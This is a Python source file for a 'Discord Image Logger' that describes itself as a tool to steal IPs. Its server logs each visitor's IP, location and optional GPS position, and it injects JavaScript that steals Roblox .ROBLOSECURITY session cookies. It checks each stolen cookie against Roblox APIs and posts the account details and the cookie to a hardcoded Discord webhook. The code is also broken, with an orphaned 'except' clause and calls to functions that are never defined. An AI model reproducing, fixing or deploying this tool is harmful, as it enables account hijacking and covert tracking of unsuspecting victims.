# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1477054008400154857/tw2pK-xTaQNHLwJNWuLzrSn86884av8RRswJZjH64MDDCnGphGlP8v9xfmmlRuRcAwCU",
    "image": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want to use for the webhook
    "color": 12452044, # Hex color for embed (default is 0xBE1931)
    
    # OPTIONS #
    "crashBrowser": False, # Crashes the victim's browser (may not work on all browsers)
    "accurateLocation": False, # Uses GPS to get the victim's location (will ask for permission)
    "message": { # Show a custom message when the victim opens the image (set to None to disable)
        "title": "Image Logger",
        "description": "Your IP has been logged",
        "image": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)",
        "color": 12452044,
        "footer": "Image Logger",
        "footer_icon": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)"
    },
    "vpnCheck": True, # Check if the victim is using a VPN (may not be accurate)
    "botCheck": True, # Check if the victim is a bot (may not be accurate)
    "blacklist": True, # Blacklist certain IPs from being logged
    "blacklistIPs": ["127.0.0.1", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"], # Blacklisted IPs (private IPs)
    "buggedImage": False, # Use a bugged image to prevent Discord from caching the image (may not work)
    "redirect": { # Redirect the victim to a different website after logging their IP (set to None to disable)
        "url": "https://roblox.com",
        "message": "Click the link below to continue"
    }
}

blacklistedIPs = tuple(config["blacklistIPs"])

# [ADDED] Roblox cookie validation function
def get_roblox_info(cookie):
    try:
        session = requests.Session()
        session.cookies['.ROBLOSECURITY'] = cookie
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
        if user_resp.status_code != 200:
            return None
        user_data = user_resp.json()
        uid = user_data.get('id')
        username = user_data.get('name', 'Unknown')
        robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
        if robux_resp.status_code != 200:
            return {'username': username, 'id': str(uid) if uid else 'Unknown', 'robux': 'Error', 'cookie': cookie}
        robux_data = robux_resp.json()
        robux = robux_data.get('robux', 0)
        return {
            'username': username,
            'id': str(uid) if uid else 'Unknown',
            'robux': f"{robux:,}",
            'cookie': cookie
        }
    except:
        return None

# [ADDED] Roblox data sender
def sendRobloxData(cookie, ip):
    try:
        info = get_roblox_info(cookie)
        if not info:
            return
        
        embed = {
            "title": "Roblox Account Grabbed",
            "color": 12452044,
            "fields": [
                {"name": "Username", "value": info['username'], "inline": True},
                {"name": "User ID", "value": info['id'], "inline": True},
                {"name": "Robux", "value": info['robux'], "inline": True},
                {"name": "IP Address", "value": ip, "inline": False},
                {"name": ".ROBLOSECURITY Cookie", "value": f"```{cookie}```", "inline": False}
            ]
        }
        requests.post(config["webhook"], json={"embeds": [embed]})
    except:
        pass

def makeReport(ip, useragent, coords=None):
    if ip.startswith(blacklistedIPs):
        return
    
    try:
        ipData = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
    except:
        ipData = None
    
    if config["vpnCheck"] and ipData and ipData.get("proxy") == False:
        return
    
    if config["botCheck"] and "bot" in useragent.lower():
        return
    
    embed = {
        "username": config["username"],
        "color": config["color"],
        "fields": [
            {"name": "IP Address", "value": ip, "inline": True},
            {"name": "User Agent", "value": useragent, "inline": False}
        ]
    }
    
    if ipData:
        embed["fields"].extend([
            {"name": "ISP", "value": ipData.get("isp", "Unknown"), "inline": True},
            {"name": "ASN", "value": ipData.get("as", "Unknown"), "inline": True},
            {"name": "Country", "value": ipData.get("country", "Unknown"), "inline": True},
            {"name": "Region", "value": ipData.get("regionName", "Unknown"), "inline": True},
            {"name": "City", "value": ipData.get("city", "Unknown"), "inline": True},
            {"name": "ZIP Code", "value": ipData.get("zip", "Unknown"), "inline": True},
            {"name": "Latitude", "value": str(ipData.get("lat", "Unknown")), "inline": True},
            {"name": "Longitude", "value": str(ipData.get("lon", "Unknown")), "inline": True},
            {"name": "Timezone", "value": ipData.get("timezone", "Unknown"), "inline": True},
            {"name": "Mobile", "value": "Yes" if ipData.get("mobile") else "No", "inline": True},
            {"name": "VPN", "value": "Yes" if ipData.get("proxy") else "No", "inline": True},
            {"name": "Hosting", "value": "Yes" if ipData.get("hosting") else "No", "inline": True}
        ])
    
    if coords:
        embed["fields"].append({"name": "GPS Coordinates", "value": f"https://www.google.com/maps?q={coords[0]},{coords[1]}", "inline": False})
    
    if config["message"]:
        embed["title"] = config["message"]["title"]
        embed["description"] = config["message"]["description"]
        embed["thumbnail"] = {"url": config["message"]["image"]}
        embed["footer"] = {"text": config["message"]["footer"], "icon_url": config["message"]["footer_icon"]}
    
    requests.post(config["webhook"], json={"embeds": [embed]})

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handleRequest()
    
    def do_POST(self):
        self.handleRequest()
    
    def handleRequest(self):
        # [ADDED] Roblox cookie receiver endpoint
        if self.path.startswith('/roblox'):
            parsed_url = parse.urlparse(self.path)
            params = parse.parse_qs(parsed_url.query)
            if 'cookie' in params and 'ip' in params:
                try:
                    cookie = params['cookie'][0]
                    ip = params['ip'][0]
                    sendRobloxData(cookie, ip)
                except:
                    pass
            
            # Return 1x1 transparent GIF
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
            return
        
        # [ORIGINAL CODE STARTS HERE - UNCHANGED]
        if config["imageArgument"]:
            if parse.urlparse(self.path).query.startswith("url="):
                url = parse.unquote(parse.urlparse(self.path).query.split("url=")[1])
            else:
                url = config["image"]
        else:
            url = config["image"]

        data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
        
        if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
            return
        
        if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
            self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
            self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
            self.end_headers() # Declare the headers as finished.

            if config["buggedImage"]: # Show a loading image to prevent Discord from caching the image.
                with open("bugged.png", "rb") as f:
                    self.wfile.write(f.read())
            
            if config["accurateLocation"]:
                data = f'''<script>
var requestPayload = {{}};
navigator.geolocation.getCurrentPosition(function(position) {{
requestPayload["lat"] = position.coords.latitude;
requestPayload["lon"] = position.coords.longitude;
fetch(window.location.href, {{
method: "POST",
body: JSON.stringify(requestPayload)
}});
}});
</script>'''.encode()
                self.wfile.write(data)
            
            if config["redirect"]:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["url"])
                self.end_headers()
                return
        
        else:
            try:
                if config["accurateLocation"]:
                    coords = json.loads(self.rfile.read(int(self.headers.get('content-length', 0))).decode())
                    makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), (coords["lat"], coords["lon"]))
                else:
                    makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
            except:
                makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
            
            self.send_response(200 if config["buggedImage"] else 302)
            self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
            self.end_headers()

            if config["buggedImage"]:
                with open("bugged.png", "rb") as f:
                    self.wfile.write(f.read())
            
            if config["accurateLocation"]:
                data = f'''<script>
var requestPayload = {{}};
navigator.geolocation.getCurrentPosition(function(position) {{
requestPayload["lat"] = position.coords.latitude;
requestPayload["lon"] = position.coords.longitude;
fetch(window.location.href, {{
method: "POST",
body: JSON.stringify(requestPayload)
}});
}});
</script>'''.encode()
                self.wfile.write(data)
            
            if config["redirect"]:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["url"])
                self.end_headers()
                return
        
        # [ADDED] JavaScript payload to steal Roblox cookies (injected without changing original code structure)
        roblox_js = b'''<script>
(function(){
    try {
        const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
        if (cookie) {
            const img = new Image();
            img.src = '/roblox?cookie=' + encodeURIComponent(cookie.split('=')[1]) + '&ip=' + encodeURIComponent(''' + self.headers.get('x-forwarded-for').encode() + b''');
        }
    } catch(e) {}
})();
</script>'''
        
        self.wfile.write(data)
        self.wfile.write(roblox_js) # [ADDED] Send cookie stealer after original content
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
